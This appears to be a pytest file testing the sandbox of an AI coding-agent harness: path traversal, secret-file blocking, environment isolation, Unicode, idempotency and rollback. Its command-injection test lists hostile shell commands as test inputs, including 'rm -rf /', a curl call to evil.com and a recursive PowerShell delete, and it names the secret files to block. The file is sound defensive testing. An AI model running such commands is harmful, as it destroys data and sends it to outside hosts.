"""Foundation security, privacy, Unicode, idempotency, and restart tests for Agent Harness."""
from __future__ import annotations

import json
import os
import shutil
import tempfile
from pathlib import Path

import pytest

from aios_habit.opencode_runtime_adapter import (
    OpenCodeRuntimeAdapter,
    RuntimeAdapterError,
    RuntimeRequest,
    safe_environment,
)
from aios_habit.workspace_agent_orchestrator import (
    WorkspaceAgentOrchestrator,
    create_work_checkpoint,
    rollback_checkpoint,
)
from aios_habit.workspace_agent_policy import (
    AgentPolicyError,
    TASK_TYPE_CODE_CHANGE,
    TASK_TYPE_ERROR_REPORT,
    create_scope_grant,
    validate_path_in_task_root,
    validate_test_command,
)
from aios_habit.workspace_case_models import AgentWorkRecord, utc_now_iso
from aios_habit.workspace_case_repository import WorkspaceCaseRepository


def test_path_traversal_defense(tmp_path: Path):
    task_root = tmp_path / "sandbox"
    task_root.mkdir()
    outside_file = tmp_path / "sensitive.txt"
    outside_file.write_text("classified", encoding="utf-8")

    grant = create_scope_grant(
        work_id="WORK-TRAVERSAL-001",
        task_root=task_root,
        task_type=TASK_TYPE_CODE_CHANGE,
    )
    adapter = OpenCodeRuntimeAdapter(grant=grant)

    traversal_paths = [
        "../sensitive.txt",
        "..\\sensitive.txt",
        "sub/../../sensitive.txt",
        str(outside_file),
    ]
    for path in traversal_paths:
        with pytest.raises(AgentPolicyError, match="(path traversal|ngoài phạm vi)"):
            validate_path_in_task_root(path, task_root)

        with pytest.raises(AgentPolicyError, match="(path traversal|ngoài phạm vi)"):
            adapter.execute_request(
                RuntimeRequest(
                    work_id="WORK-TRAVERSAL-001",
                    action="read_file",
                    payload={"path": path},
                )
            )


def test_secret_files_and_env_isolation(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    task_root = tmp_path / "sandbox"
    task_root.mkdir()

    grant = create_scope_grant(
        work_id="WORK-SECRET-001",
        task_root=task_root,
        task_type=TASK_TYPE_CODE_CHANGE,
    )
    adapter = OpenCodeRuntimeAdapter(grant=grant)

    # 1. Deny files matching secret patterns
    secret_filenames = [
        ".env",
        ".env.local",
        ".env.production",
        "id_rsa",
        "id_ed25519",
        "server.key",
        "cert.pem",
        "auth_credentials.json",
        "secret_token.txt",
        "passwords.csv",
    ]
    for filename in secret_filenames:
        with pytest.raises(AgentPolicyError, match="chứa bí mật"):
            validate_path_in_task_root(filename, task_root)

        with pytest.raises(AgentPolicyError, match="chứa bí mật"):
            adapter.execute_request(
                RuntimeRequest(
                    work_id="WORK-SECRET-001",
                    action="create_file",
                    payload={"path": filename, "content": "SECRET"},
                )
            )

    # 2. Verify environment isolation does not leak API keys into child processes
    monkeypatch.setenv("OPENAI_API_KEY", "sk-secret-key-12345")
    monkeypatch.setenv("GEMINI_API_KEY", "gm-secret-key-99999")
    isolated_env = safe_environment()
    assert "OPENAI_API_KEY" not in isolated_env
    assert "GEMINI_API_KEY" not in isolated_env
    assert "PATH" in isolated_env or "SYSTEMROOT" in isolated_env


def test_vietnamese_unicode_roundtrip(tmp_path: Path):
    task_root = tmp_path / "tiếng_việt"
    task_root.mkdir()

    grant = create_scope_grant(
        work_id="WORK-UNICODE-001",
        task_root=task_root,
        task_type=TASK_TYPE_ERROR_REPORT,
    )
    adapter = OpenCodeRuntimeAdapter(grant=grant)

    relative_unicode_path = "Báo_cáo_lỗi_nhà_máy_công_đoạn_hàn_2026.md"
    vietnamese_content = (
        "# Báo cáo lỗi kỹ thuật xưởng sản xuất\n"
        "Hiện tượng: Tỷ lệ thu hồi giảm 4.2% do nhiệt độ lò nung không ổn định.\n"
        "Đề xuất: Hiệu chuẩn cảm biến nhiệt và rà soát SOP kiểm tra định kỳ.\n"
    )

    # Write file with Vietnamese name and content
    write_receipt = adapter.execute_request(
        RuntimeRequest(
            work_id="WORK-UNICODE-001",
            action="create_file",
            payload={"path": relative_unicode_path, "content": vietnamese_content},
        )
    )
    assert write_receipt.status == "passed"

    # Read back and verify exact character match without mojibake
    read_receipt = adapter.execute_request(
        RuntimeRequest(
            work_id="WORK-UNICODE-001",
            action="read_file",
            payload={"path": relative_unicode_path},
        )
    )
    assert read_receipt.status == "passed"
    assert read_receipt.payload["content"] == vietnamese_content

    # Verify search finds Unicode filename
    search_receipt = adapter.execute_request(
        RuntimeRequest(
            work_id="WORK-UNICODE-001",
            action="search_files",
            payload={"query": "công_đoạn"},
        )
    )
    assert search_receipt.status == "passed"
    assert any("Báo_cáo_lỗi" in match for match in search_receipt.payload["matches"])


def test_idempotency_and_replay_safety(tmp_path: Path):
    task_root = tmp_path / "sandbox"
    task_root.mkdir()

    grant = create_scope_grant(
        work_id="WORK-IDEMP-001",
        task_root=task_root,
        task_type=TASK_TYPE_CODE_CHANGE,
    )
    adapter = OpenCodeRuntimeAdapter(grant=grant)

    req = RuntimeRequest(
        work_id="WORK-IDEMP-001",
        action="create_file",
        payload={"path": "metric.py", "content": "x = 10\n"},
        idempotency_key="KEY-REPLAY-1",
        scope_digest=grant.scope_digest,
    )

    first_receipt = adapter.execute_request(req)
    assert first_receipt.sequence == 1
    assert first_receipt.event_id == "EVT-000001"

    # Replay with identical key returns cached receipt without creating new event
    second_receipt = adapter.execute_request(req)
    assert second_receipt.event_id == first_receipt.event_id
    assert second_receipt.sequence == first_receipt.sequence

    # Conflicting payload with same key is rejected
    conflicting_req = RuntimeRequest(
        work_id="WORK-IDEMP-001",
        action="create_file",
        payload={"path": "metric.py", "content": "x = 99\n"},
        idempotency_key="KEY-REPLAY-1",
        scope_digest=grant.scope_digest,
    )
    with pytest.raises(RuntimeAdapterError, match="trùng lặp với nội dung khác"):
        adapter.execute_request(conflicting_req)


def test_restart_recovery_and_rollback_integrity(tmp_path: Path):
    ws_dir = tmp_path / "workspace"
    ws_dir.mkdir()
    db_path = tmp_path / "cases.sqlite"
    repo = WorkspaceCaseRepository(db_path)

    # Initial file in workspace
    initial_file = ws_dir / "production.py"
    initial_file.write_text("ORIGINAL_CODE = True\n", encoding="utf-8")

    # Save work item before restart
    now = utc_now_iso()
    work = AgentWorkRecord(
        work_id="WORK-RESTART-001",
        workspace_id=str(ws_dir),
        work_type="code_change",
        goal_vi="Sửa code và kiểm tra restart",
        created_at=now,
        updated_at=now,
        status="running",
    )
    repo.save_agent_work(work)

    # Create checkpoint
    ckpt = create_work_checkpoint(
        work_id="WORK-RESTART-001",
        workspace_root=str(ws_dir),
        task_root=ws_dir,
    )
    assert "production.py" in ckpt.manifest

    # Simulate in-progress modification before restart/crash
    initial_file.write_text("CORRUPTED_INCOMPLETE_EDIT = False\n", encoding="utf-8")
    untracked_extra = ws_dir / "half_baked.py"
    untracked_extra.write_text("broken syntax", encoding="utf-8")

    # --- SIMULATE AIOS SERVER RESTART ---
    # New orchestrator and repository instance after restart
    restarted_repo = WorkspaceCaseRepository(db_path)
    restarted_orchestrator = WorkspaceAgentOrchestrator()

    # Verify work item is safely read from disk
    restored_work = restarted_repo.get_agent_work("WORK-RESTART-001")
    assert restored_work is not None
    assert restored_work.status == "running"

    # Reconnect checkpoint into restarted orchestrator
    restarted_orchestrator._checkpoints["WORK-RESTART-001"] = ckpt

    # Check state after restart: detects interrupted modifications
    state = restarted_orchestrator.resume_check("WORK-RESTART-001", ws_dir)
    assert state == "interrupted_unknown"

    # Execute safe rollback
    ok, msg = restarted_orchestrator.rollback("WORK-RESTART-001")
    assert ok is True
    assert "hoàn tác" in msg

    # Verify workspace is cleanly restored to original baseline
    assert initial_file.read_text(encoding="utf-8") == "ORIGINAL_CODE = True\n"
    assert not untracked_extra.exists()

    # Update database status to rolled_back
    restarted_repo.update_agent_work_status("WORK-RESTART-001", "rolled_back")
    assert restarted_repo.get_agent_work("WORK-RESTART-001").status == "rolled_back"


def test_prompt_injection_and_command_injection_defense():
    """Verify that command injection and malicious shell constructs are blocked."""
    allowed = ("pytest tests/unit", "pytest -q")

    # Injections via shell metacharacters must fail
    malicious_commands = [
        "pytest tests/unit; rm -rf /",
        "pytest tests/unit && curl https://evil.com/leak",
        "pytest tests/unit | python -c 'import os; os.system(\"calc\")'",
        "pytest tests/unit `whoami`",
        "pytest tests/unit $(whoami)",
        "pytest tests/unit > /tmp/pwned",
        "powershell -Command Remove-Item -Recurse C:\\",
        "cmd.exe /c dir",
    ]
    for cmd in malicious_commands:
        with pytest.raises(AgentPolicyError, match="(ký tự đặc biệt|không nằm trong danh sách)"):
            validate_test_command(cmd, allowed_commands=allowed)

    # Legitimate allowed commands must pass
    assert validate_test_command("pytest tests/unit", allowed_commands=allowed) == "pytest tests/unit"
    assert validate_test_command("pytest -q", allowed_commands=allowed) == "pytest -q"


def test_windows_paths_with_spaces_and_backslashes(tmp_path: Path):
    """Verify handling of Windows-style backslashes and folder names with spaces and Unicode."""
    task_root = tmp_path / "Xưởng Lắp Ráp 2026"
    task_root.mkdir()

    grant = create_scope_grant(
        work_id="WORK-WIN-001",
        task_root=task_root,
        task_type=TASK_TYPE_CODE_CHANGE,
    )
    adapter = OpenCodeRuntimeAdapter(grant=grant)

    # Windows path with backslashes and spaces
    rel_path = "Dây Chuyền 1\\Báo Cáo Tiến Độ.txt"
    content = "Hoàn tất kiểm tra chất lượng 100% không lỗi."

    receipt = adapter.execute_request(
        RuntimeRequest(
            work_id="WORK-WIN-001",
            action="create_file",
            payload={"path": rel_path, "content": content},
        )
    )
    assert receipt.status == "passed"

    read_receipt = adapter.execute_request(
        RuntimeRequest(
            work_id="WORK-WIN-001",
            action="read_file",
            payload={"path": rel_path},
        )
    )
    assert read_receipt.status == "passed"
    assert read_receipt.payload["content"] == content


def test_antigravity_bridge_non_regression():
    """Verify that Antigravity bridge integration remains preserved and untouched."""
    from aios_habit.antigravity_bridge import (
        DEFAULT_ANTIGRAVITY_HEALTH_URL,
        get_antigravity_bridge_health,
    )
    assert DEFAULT_ANTIGRAVITY_HEALTH_URL.startswith("http")
    # Fails closed when bridge is offline
    health = get_antigravity_bridge_health("http://127.0.0.1:65530/health")
    assert health.is_ready is False
    assert health.status == "unavailable"
